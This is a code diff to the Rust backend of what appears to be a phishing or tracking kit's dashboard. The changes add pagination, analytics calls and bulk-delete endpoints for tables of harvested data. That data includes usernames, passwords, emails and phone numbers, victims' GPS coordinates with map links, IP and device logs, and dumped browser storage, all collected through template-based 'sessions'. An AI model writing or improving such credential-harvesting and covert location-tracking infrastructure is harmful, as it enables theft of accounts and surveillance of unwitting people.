@@ -86,6 +86,7 @@ pub struct IpStats {
     entries: Vec<IpRow>,
     total: i64,
     unique_ips: i64,
+    has_more: bool,
     device_breakdown: serde_json::Value,
     browser_breakdown: serde_json::Value,
     os_breakdown: serde_json::Value,
@@ -115,6 +116,13 @@ pub struct SessionInfo {
 pub struct CreateSession {
     name: String,
     template_id: Option<String>,
+}
+
+#[derive(Serialize)]
+pub struct Paginated<T: Serialize> {
+    pub entries: Vec<T>,
+    pub total: i64,
+    pub has_more: bool,
 }
 
 pub async fn get_stats(State(state): State<Arc<AppState>>) -> Result<Json<Stats>, StatusCode> {
@@ -306,12 +314,30 @@ pub async fn list_ips(
     State(state): State<Arc<AppState>>,
     Query(q): Query<ListQuery>,
 ) -> Result<Json<IpStats>, StatusCode> {
-    let limit = q.limit.unwrap_or(500).min(5000);
+    let limit = q.limit.unwrap_or(50).min(500);
     let offset = q.offset.unwrap_or(0);
-    let rows: Vec<(String, String, String, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, i64)> =
-        sqlx::query_as(
-            "SELECT id, session_id, ip_address, user_agent, device, browser, os, city, country, geo_data, created_at FROM ip_logs ORDER BY created_at DESC LIMIT ? OFFSET ?"
-        ).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+
+    let (rows, total, unique_ips) = if let Some(session) = &q.session {
+        let rows: Vec<(String, String, String, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, i64)> =
+            sqlx::query_as(
+                "SELECT id, session_id, ip_address, user_agent, device, browser, os, city, country, geo_data, created_at FROM ip_logs WHERE session_id = ? ORDER BY created_at DESC LIMIT ? OFFSET ?"
+            ).bind(session).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM ip_logs WHERE session_id = ?")
+            .bind(session).fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        let unique_ips: i64 = sqlx::query_scalar("SELECT COUNT(DISTINCT ip_address) FROM ip_logs WHERE session_id = ?")
+            .bind(session).fetch_one(&state.pool).await.unwrap_or(0);
+        (rows, total, unique_ips)
+    } else {
+        let rows: Vec<(String, String, String, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, i64)> =
+            sqlx::query_as(
+                "SELECT id, session_id, ip_address, user_agent, device, browser, os, city, country, geo_data, created_at FROM ip_logs ORDER BY created_at DESC LIMIT ? OFFSET ?"
+            ).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM ip_logs")
+            .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        let unique_ips: i64 = sqlx::query_scalar("SELECT COUNT(DISTINCT ip_address) FROM ip_logs")
+            .fetch_one(&state.pool).await.unwrap_or(0);
+        (rows, total, unique_ips)
+    };
 
     let entries: Vec<IpRow> = rows.into_iter().map(|(id, session_id, ip_address, user_agent, device, browser, os, city, country, geo_data, created_at)| {
         let local_ip = geo_data.as_ref()
@@ -320,40 +346,43 @@ pub async fn list_ips(
         IpRow { id, session_id, ip_address, user_agent, device, browser, os, city, country, local_ip, created_at }
     }).collect();
 
-    let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM ip_logs")
-        .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
-    let unique_ips: i64 = sqlx::query_scalar("SELECT COUNT(DISTINCT ip_address) FROM ip_logs")
-        .fetch_one(&state.pool).await.unwrap_or(0);
-
+    let has_more = (offset + limit) < total;
     let device_breakdown = get_breakdown(&state.pool, "device").await;
     let browser_breakdown = get_breakdown(&state.pool, "browser").await;
     let os_breakdown = get_breakdown(&state.pool, "os").await;
 
-    Ok(Json(IpStats { entries, total, unique_ips, device_breakdown, browser_breakdown, os_breakdown }))
+    Ok(Json(IpStats { entries, total, unique_ips, has_more, device_breakdown, browser_breakdown, os_breakdown }))
 }
 
 pub async fn list_locations(
     State(state): State<Arc<AppState>>,
     Query(q): Query<ListQuery>,
-) -> Result<Json<Vec<LocationRow>>, StatusCode> {
-    let limit = q.limit.unwrap_or(200).min(2000);
+) -> Result<Json<Paginated<LocationRow>>, StatusCode> {
+    let limit = q.limit.unwrap_or(50).min(500);
     let offset = q.offset.unwrap_or(0);
-    let rows = if let Some(session) = &q.session {
-        sqlx::query_as::<_, (String, String, f64, f64, Option<f64>, Option<String>, i64)>(
+    let (rows, total) = if let Some(session) = &q.session {
+        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM locations WHERE session_id = ?")
+            .bind(session).fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        let rows = sqlx::query_as::<_, (String, String, f64, f64, Option<f64>, Option<String>, i64)>(
             "SELECT id, session_id, latitude, longitude, accuracy, address, created_at FROM locations WHERE session_id = ? ORDER BY created_at DESC LIMIT ? OFFSET ?"
-        ).bind(session).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
+        ).bind(session).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        (rows, total)
     } else {
-        sqlx::query_as::<_, (String, String, f64, f64, Option<f64>, Option<String>, i64)>(
+        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM locations")
+            .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        let rows = sqlx::query_as::<_, (String, String, f64, f64, Option<f64>, Option<String>, i64)>(
             "SELECT id, session_id, latitude, longitude, accuracy, address, created_at FROM locations ORDER BY created_at DESC LIMIT ? OFFSET ?"
-        ).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
+        ).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        (rows, total)
     };
 
-    let locations: Vec<LocationRow> = rows.into_iter().map(|(id, session_id, lat, lon, acc, address, created_at)| {
+    let entries: Vec<LocationRow> = rows.into_iter().map(|(id, session_id, lat, lon, acc, address, created_at)| {
         let maps_url = format!("https://www.google.com/maps/place/{},{}", lat, lon);
         LocationRow { id, session_id, latitude: lat, longitude: lon, accuracy: acc, address, created_at, maps_url }
     }).collect();
 
-    Ok(Json(locations))
+    let has_more = (offset + limit) < total;
+    Ok(Json(Paginated { entries, total, has_more }))
 }
 
 pub async fn list_templates(State(state): State<Arc<AppState>>) -> Result<Json<Vec<TemplateInfo>>, StatusCode> {
@@ -380,20 +409,32 @@ pub struct EventRow {
 pub async fn list_events(
     State(state): State<Arc<AppState>>,
     Query(q): Query<EventQuery>,
-) -> Result<Json<Vec<EventRow>>, StatusCode> {
-    let session = q.session.unwrap_or_else(|| "default".into());
-    let limit = q.limit.unwrap_or(500).min(5000);
+) -> Result<Json<Paginated<EventRow>>, StatusCode> {
+    let limit = q.limit.unwrap_or(50).min(500);
     let offset = q.offset.unwrap_or(0);
-    let rows: Vec<(String, String, String, Option<String>, i64)> = sqlx::query_as(
-        "SELECT id, session_id, event_type, event_data, created_at FROM events WHERE session_id = ? ORDER BY created_at ASC LIMIT ? OFFSET ?"
-    ).bind(&session).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    let (rows, total) = if let Some(session) = &q.session {
+        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM events WHERE session_id = ?")
+            .bind(session).fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        let rows: Vec<(String, String, String, Option<String>, i64)> = sqlx::query_as(
+            "SELECT id, session_id, event_type, event_data, created_at FROM events WHERE session_id = ? ORDER BY created_at ASC LIMIT ? OFFSET ?"
+        ).bind(session).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        (rows, total)
+    } else {
+        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM events")
+            .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        let rows: Vec<(String, String, String, Option<String>, i64)> = sqlx::query_as(
+            "SELECT id, session_id, event_type, event_data, created_at FROM events ORDER BY created_at ASC LIMIT ? OFFSET ?"
+        ).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        (rows, total)
+    };
 
-    let events: Vec<EventRow> = rows.into_iter().map(|(id, session_id, event_type, event_data, created_at)| {
+    let entries: Vec<EventRow> = rows.into_iter().map(|(id, session_id, event_type, event_data, created_at)| {
         let parsed_data = event_data.and_then(|d| serde_json::from_str(&d).ok());
         EventRow { id, session_id, event_type, event_data: parsed_data, created_at }
     }).collect();
 
-    Ok(Json(events))
+    let has_more = (offset + limit) < total;
+    Ok(Json(Paginated { entries, total, has_more }))
 }
 
 #[derive(Deserialize)]
@@ -426,6 +467,8 @@ pub async fn create_session(
     sqlx::query("INSERT INTO sessions (id, name, template_id, status, created_at) VALUES (?, ?, ?, 'active', ?)")
         .bind(&id).bind(&body.name).bind(&template_id).bind(now)
         .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+
+    state.posthog.capture_session_created(&body.name, &template_id).await;
 
     Ok(Json(SessionInfo { id, name: body.name, template_id, status: "active".into(), created_at: now }))
 }
@@ -495,24 +538,31 @@ pub struct CredentialRow {
 pub async fn list_credentials(
     State(state): State<Arc<AppState>>,
     Query(q): Query<ListQuery>,
-) -> Result<Json<Vec<CredentialRow>>, StatusCode> {
-    let limit = q.limit.unwrap_or(200).min(1000);
+) -> Result<Json<Paginated<CredentialRow>>, StatusCode> {
+    let limit = q.limit.unwrap_or(50).min(500);
     let offset = q.offset.unwrap_or(0);
-    let rows = if let Some(session) = &q.session {
-        sqlx::query_as::<_, (String, String, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, i64)>(
+    let (rows, total) = if let Some(session) = &q.session {
+        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM credentials WHERE session_id = ?")
+            .bind(session).fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        let rows = sqlx::query_as::<_, (String, String, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, i64)>(
             "SELECT id, session_id, template_id, username, password, email, phone, ip_address, created_at FROM credentials WHERE session_id = ? ORDER BY created_at DESC LIMIT ? OFFSET ?"
-        ).bind(session).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
+        ).bind(session).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        (rows, total)
     } else {
-        sqlx::query_as::<_, (String, String, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, i64)>(
+        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM credentials")
+            .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        let rows = sqlx::query_as::<_, (String, String, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, i64)>(
             "SELECT id, session_id, template_id, username, password, email, phone, ip_address, created_at FROM credentials ORDER BY created_at DESC LIMIT ? OFFSET ?"
-        ).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
+        ).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        (rows, total)
     };
 
-    let creds: Vec<CredentialRow> = rows.into_iter().map(|(id, session_id, template_id, username, password, email, phone, ip_address, created_at)| {
+    let entries: Vec<CredentialRow> = rows.into_iter().map(|(id, session_id, template_id, username, password, email, phone, ip_address, created_at)| {
         CredentialRow { id, session_id, template_id, username, password, email, phone, ip_address, created_at }
     }).collect();
 
-    Ok(Json(creds))
+    let has_more = (offset + limit) < total;
+    Ok(Json(Paginated { entries, total, has_more }))
 }
 
 #[derive(Serialize)]
@@ -527,25 +577,32 @@ pub struct StorageRow {
 pub async fn list_storage(
     State(state): State<Arc<AppState>>,
     Query(q): Query<ListQuery>,
-) -> Result<Json<Vec<StorageRow>>, StatusCode> {
-    let limit = q.limit.unwrap_or(100).min(500);
+) -> Result<Json<Paginated<StorageRow>>, StatusCode> {
+    let limit = q.limit.unwrap_or(50).min(500);
     let offset = q.offset.unwrap_or(0);
-    let rows = if let Some(session) = &q.session {
-        sqlx::query_as::<_, (String, String, Option<String>, Option<String>, i64)>(
+    let (rows, total) = if let Some(session) = &q.session {
+        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM storage_dumps WHERE session_id = ?")
+            .bind(session).fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        let rows = sqlx::query_as::<_, (String, String, Option<String>, Option<String>, i64)>(
             "SELECT id, session_id, data, ip_address, created_at FROM storage_dumps WHERE session_id = ? ORDER BY created_at DESC LIMIT ? OFFSET ?"
-        ).bind(session).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
+        ).bind(session).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        (rows, total)
     } else {
-        sqlx::query_as::<_, (String, String, Option<String>, Option<String>, i64)>(
+        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM storage_dumps")
+            .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        let rows = sqlx::query_as::<_, (String, String, Option<String>, Option<String>, i64)>(
             "SELECT id, session_id, data, ip_address, created_at FROM storage_dumps ORDER BY created_at DESC LIMIT ? OFFSET ?"
-        ).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
+        ).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        (rows, total)
     };
 
-    let dumps: Vec<StorageRow> = rows.into_iter().map(|(id, session_id, data, ip_address, created_at)| {
+    let entries: Vec<StorageRow> = rows.into_iter().map(|(id, session_id, data, ip_address, created_at)| {
         let parsed = data.and_then(|d| serde_json::from_str(&d).ok());
         StorageRow { id, session_id, ip_address, data: parsed, created_at }
     }).collect();
 
-    Ok(Json(dumps))
+    let has_more = (offset + limit) < total;
+    Ok(Json(Paginated { entries, total, has_more }))
 }
 
 pub async fn delete_credential(
@@ -586,6 +643,60 @@ pub async fn delete_all_credentials(State(state): State<Arc<AppState>>) -> Resul
     .bind("dashboard")
     .bind("delete")
     .bind("credential")
+    .bind(None::<String>)
+    .bind(None::<String>)
+    .bind("")
+    .bind(chrono::Utc::now().timestamp())
+    .execute(&state.pool).await;
+    Ok(StatusCode::NO_CONTENT)
+}
+
+pub async fn delete_all_ips(State(state): State<Arc<AppState>>) -> Result<StatusCode, StatusCode> {
+    sqlx::query("DELETE FROM ip_logs")
+        .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    let _ = sqlx::query(
+        "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
+    )
+    .bind(uuid::Uuid::new_v4().to_string())
+    .bind("dashboard")
+    .bind("delete")
+    .bind("ip_logs")
+    .bind(None::<String>)
+    .bind(None::<String>)
+    .bind("")
+    .bind(chrono::Utc::now().timestamp())
+    .execute(&state.pool).await;
+    Ok(StatusCode::NO_CONTENT)
+}
+
+pub async fn delete_all_locations(State(state): State<Arc<AppState>>) -> Result<StatusCode, StatusCode> {
+    sqlx::query("DELETE FROM locations")
+        .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    let _ = sqlx::query(
+        "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
+    )
+    .bind(uuid::Uuid::new_v4().to_string())
+    .bind("dashboard")
+    .bind("delete")
+    .bind("locations")
+    .bind(None::<String>)
+    .bind(None::<String>)
+    .bind("")
+    .bind(chrono::Utc::now().timestamp())
+    .execute(&state.pool).await;
+    Ok(StatusCode::NO_CONTENT)
+}
+
+pub async fn delete_all_events(State(state): State<Arc<AppState>>) -> Result<StatusCode, StatusCode> {
+    sqlx::query("DELETE FROM events")
+        .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    let _ = sqlx::query(
+        "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
+    )
+    .bind(uuid::Uuid::new_v4().to_string())
+    .bind("dashboard")
+    .bind("delete")
+    .bind("events")
     .bind(None::<String>)
     .bind(None::<String>)
     .bind("")
